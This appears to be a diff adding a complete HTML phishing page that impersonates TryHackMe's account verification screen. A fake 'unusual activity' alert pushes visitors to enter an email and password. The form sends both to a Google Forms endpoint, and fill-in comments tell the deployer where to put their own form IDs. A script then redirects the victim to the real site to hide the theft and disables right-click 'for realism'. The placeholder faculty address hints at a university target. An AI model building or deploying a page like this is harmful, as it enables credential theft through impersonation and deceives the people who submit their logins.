@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TryHackMe | Account Verification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        
+        body {
+            background: #151c2b;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: #1f2937;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 440px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+        }
+        
+        .header {
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            padding: 40px 30px;
+            text-align: center;
+        }
+        
+        .logo {
+            color: white;
+            font-size: 32px;
+            font-weight: 800;
+            letter-spacing: 1px;
+        }
+        
+        .logo span {
+            color: #a2ea2a;
+        }
+        
+        .title {
+            color: white;
+            font-size: 20px;
+            font-weight: 500;
+            margin-top: 10px;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 40px;
+        }
+        
+        .alert {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #fca5a5;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            font-size: 15px;
+            text-align: center;
+        }
+        
+        .alert strong {
+            color: white;
+            font-weight: 600;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        label {
+            display: block;
+            color: #d1d5db;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px;
+            background: #374151;
+            border: 1px solid #4b5563;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.2s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        input::placeholder {
+            color: #9ca3af;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+            margin-top: 10px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .links {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 14px;
+            color: #9ca3af;
+        }
+        
+        .links a {
+            color: #667eea;
+            text-decoration: none;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #374151;
+            text-align: center;
+            color: #6b7280;
+            font-size: 12px;
+        }
+        
+        .security-note {
+            background: rgba(34, 197, 94, 0.1);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            color: #86efac;
+            padding: 12px;
+            border-radius: 6px;
+            margin-top: 20px;
+            font-size: 13px;
+            text-align: center;
+        }
+        
+        .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <div class="logo">TRY<span>HACK</span>ME</div>
+            <div class="title">Security Verification Required</div>
+        </div>
+        
+        <div class="content">
+            <div class="alert">
+                <strong>⚠️ Unusual Activity Detected</strong><br>
+                Your account requires verification due to login from new location.
+            </div>
+            
+            <!-- REPLACE FORM ACTION WITH YOUR GOOGLE FORMS URL -->
+            <form id="loginForm" action="https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse" method="POST" target="_blank">
+                <!-- Email field - REPLACE entry.XXXX with your actual field ID -->
+                <div class="form-group">
+                    <label for="email">Email address</label>
+                    <input type="email" id="email" name="entry.1234567890" placeholder="faculty@western.edu" required autofocus>
+                </div>
+                
+                <!-- Password field - REPLACE entry.XXXX with your actual field ID -->
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="entry.0987654321" placeholder="••••••••" required>
+                </div>
+                
+                <button type="submit" class="login-btn" id="submitBtn">
+                    <span id="btnText">Verify Account & Continue</span>
+                    <div class="loader" id="loader"></div>
+                </button>
+            </form>
+            
+            <div class="links">
+                <a href="https://tryhackme.com/forgot-password">Forgot password?</a> • 
+                <a href="https://tryhackme.com/pricing">Get access</a>
+            </div>
+            
+            <div class="security-note">
+                🔒 This verification protects your account and progress
+            </div>
+            
+            <div class="footer">
+                By signing in, you agree to our<br>
+                <a href="https://tryhackme.com/terms">Terms of Service</a> and 
+                <a href="https://tryhackme.com/privacy">Privacy Policy</a>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // Show loading state
+            document.getElementById('btnText').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('submitBtn').disabled = true;
+            
+            // Let form submit to Google Forms
+            // Then redirect to real TryHackMe
+            setTimeout(function() {
+                window.location.href = 'https://tryhackme.com';
+            }, 1500);
+        });
+        
+        // Add some realism
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
